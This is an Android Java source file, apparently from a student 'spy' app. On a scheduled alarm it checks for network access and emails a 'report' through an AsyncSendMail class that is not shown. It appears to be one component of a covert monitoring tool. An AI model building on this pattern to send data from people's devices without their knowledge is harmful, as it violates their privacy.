package edu.uj.jkordas.spy.receiver;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import edu.uj.jkordas.spy.AsyncSendMail;
import edu.uj.jkordas.spy.developer.Logger;

public class AlarmReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (isNetworkConnected(context)) {
            new AsyncSendMail(context).execute();
            Logger.log(context, "report has been send");
        } else {
            Logger.log(context, "no internet connection");
        }
    }

    private boolean isNetworkConnected(Context context) {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo ni = cm.getActiveNetworkInfo();
        if (ni == null) {
            // There are no active networks.
            return false;
        } else
            return true;
    }

}
